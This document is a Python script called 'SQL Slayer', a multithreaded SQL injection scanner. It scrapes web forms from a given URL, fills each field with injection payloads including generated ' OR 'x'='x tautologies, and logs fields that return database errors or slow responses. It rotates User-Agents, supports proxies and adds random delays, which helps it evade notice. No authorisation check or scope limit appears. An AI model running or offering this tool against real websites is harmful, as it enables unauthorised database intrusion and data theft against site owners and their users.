import requests
from bs4 import BeautifulSoup
import urllib.parse
import logging
import random
import time
import threading
from concurrent.futures import ThreadPoolExecutor, as_completed
import argparse
import json

# Read configuration
with open('config.json') as config_file:
    config = json.load(config_file)

# List of SQL error messages to check in responses
sql_errors = config["sql_errors"]

# List of User-Agents
user_agents = config["user_agents"]

# Proxy list (example format: "http://proxyip:port")
proxies = config["proxies"]

# Configure logging
logging.basicConfig(filename=config["log_file"], level=logging.INFO, format='%(asctime)s - %(message)s')

class SQLInjectionTester:
    def __init__(self, base_url, threads, proxy=None):
        self.base_url = base_url
        self.threads = threads
        self.proxy = proxy
        self.lock = threading.Lock()
        self.results = []

    def fetch_forms(self):
        try:
            response = requests.get(self.base_url, headers={'User-Agent': random.choice(user_agents)}, proxies={'http': self.proxy} if self.proxy else None)
            response.raise_for_status()
            soup = BeautifulSoup(response.text, 'lxml')
            forms = soup.find_all('form')
            return forms
        except requests.RequestException as e:
            print(f"[ERROR] Failed to fetch forms: {e}")
            logging.error(f"[ERROR] Failed to fetch forms: {e}")
            return []

    def test_sql_injection(self, form):
        action = form.get('action')
        method = form.get('method', 'get').lower()
        inputs = form.find_all(['input', 'textarea', 'select'])

        form_url = urllib.parse.urljoin(self.base_url, action)
        form_data = self.construct_form_data(inputs)

        for payload in self.generate_payloads(inputs):
            for key in form_data.keys():
                original_value = form_data[key]
                form_data[key] = payload

                try:
                    start_time = time.time()
                    if method == 'post':
                        response = requests.post(form_url, data=form_data, headers={'User-Agent': random.choice(user_agents)}, proxies={'http': self.proxy} if self.proxy else None, timeout=10)
                    else:
                        response = requests.get(form_url, params=form_data, headers={'User-Agent': random.choice(user_agents)}, proxies={'http': self.proxy} if self.proxy else None, timeout=10)
                    end_time = time.time()
                    response.raise_for_status()

                    if self.is_vulnerable(response, payload, end_time - start_time):
                        self.log_vulnerability(form_url, payload, form_data)

                    form_data[key] = original_value
                    time.sleep(random.uniform(0.5, 1.5))

                except requests.RequestException as e:
                    error_msg = f"[ERROR] Error during SQL injection testing: {e}"
                    print(error_msg)
                    logging.error(error_msg)

    def construct_form_data(self, inputs):
        form_data = {}
        for input_tag in inputs:
            name = input_tag.get('name')
            if name:
                form_data[name] = 'test'
                if 'email' in name:
                    form_data[name] = 'test@example.com'
                elif 'user' in name:
                    form_data[name] = 'testuser'
                elif 'pass' in name:
                    form_data[name] = 'password'
        return form_data

    def generate_payloads(self, inputs):
        base_payloads = config["sql_payloads"]
        dynamic_payloads = [f"' OR '{p}'='{p}" for p in base_payloads]
        return base_payloads + dynamic_payloads

    def is_vulnerable(self, response, payload, response_time):
        if payload in response.text.lower() or any(error in response.text.lower() for error in sql_errors):
            return True
        if response_time > 2:
            return True
        return False

    def log_vulnerability(self, form_url, payload, form_data):
        with self.lock:
            result = {
                "url": form_url,
                "payload": payload,
                "form_data": form_data,
                "timestamp": time.strftime("%Y-%m-%d %H:%M:%S", time.gmtime())
            }
            self.results.append(result)
            logging.info(f"[!] SQL Injection vulnerability detected with payload: {payload} on form with action: {form_url}")

    def generate_report(self):
        report_file = "sql_injection_report.json"
        with open(report_file, 'w') as f:
            json.dump(self.results, f, indent=4)
        print(f"Report generated: {report_file}")

    def run(self):
        forms = self.fetch_forms()
        if not forms:
            print("No forms found or error fetching forms.")
            return

        print(f"Found {len(forms)} forms. Testing for SQL injection...")
        with ThreadPoolExecutor(max_workers=self.threads) as executor:
            futures = [executor.submit(self.test_sql_injection, form) for form in forms]
            for future in as_completed(futures):
                future.result()

        self.generate_report()
        print("SQL Injection testing completed. Check the log file and report for detailed results.")

def main():
    parser = argparse.ArgumentParser(description="SQL Injection Testing Tool")
    parser.add_argument("url", help="The URL of the website to test (e.g., http://example.com)")
    parser.add_argument("-t", "--threads", type=int, default=10, help="Number of threads to use for testing (default: 10)")
    parser.add_argument("-p", "--proxy", help="Proxy server to use (e.g., http://proxyip:port)")

    args = parser.parse_args()
    base_url = args.url
    proxy = args.proxy

    print("Starting SQL Slayer...\n")

    tester = SQLInjectionTester(base_url, args.threads, proxy)
    tester.run()

if __name__ == "__main__":
    main()
